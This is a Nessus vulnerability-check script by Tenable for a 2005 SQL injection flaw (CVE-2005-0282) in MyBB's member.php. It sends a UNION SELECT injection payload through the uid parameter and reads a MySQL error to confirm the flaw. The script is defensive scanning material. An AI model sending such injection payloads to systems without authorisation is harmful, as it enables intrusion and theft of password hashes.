#
# (C) Tenable Network Security
#

include("compat.inc");

if (description) {
  script_id(16143);
  script_version ("$Revision: 1.15 $");

  script_cve_id("CVE-2005-0282");
  script_bugtraq_id(12161);
  script_xref(name:"OSVDB", value:"12798");

  script_name(english:"MyBB member.php uid Parameter SQL Injection");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote version of MyBB fails to sanitize user-supplied input to
the avatar upload system via the 'uid' parameter of the 'member.php'
script.  If PHP's 'magic_quotes_gpc' setting is disabled, an attacker
may be able to leverage this issue to uncover password hashes and
thereby gain access to the application's admin panel." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=110486566600980&w=2" );
 script_set_attribute(attribute:"solution", value:
"Either enable PHP's 'magic_quotes_gpc' setting or upgrade to MyBB
Preview Release 2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for SQL injection vulnerability in MyBB's member.php script";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  
  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");
 
  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Make sure the affected script exists.
  w = http_send_recv3(method:"GET", item:string(dir, "/member.php"), port:port);
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # If it's from MyBulletinBoard...
  if (egrep(string:res, pattern:"Powered by <a href=.*www\.mybboard\.com.*MyBulletinBoard</a>")) {
    # Try to exploit one of the flaws.
    #
    # nb: use an randomly-named table so we can generate a MySQL error.
    rnd_table = string("nessus", rand_str(length:3));
    postdata = string(
      "uid=1'%20UNION%20SELECT%2010000,200,1%20AS%20type%20FROM%20", rnd_table, "%20WHERE%20uid=1%20ORDER%20BY%20uid%20DESC--"
    );
    w = http_send_recv3(method: "POST ", port: port,
      item: dir+"/member.php?action=avatar",
      content_type: "application/x-www-form-urlencoded",
      data: postdata);
    if (isnull(w)) exit(1, "the web server did not answer");
    res = w[2];

    # There's a problem if we see our table name.
    if (egrep(string:res, pattern:string("mySQL error: 1146<br>Table '.*\\.", rnd_table))) {
      security_warning(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
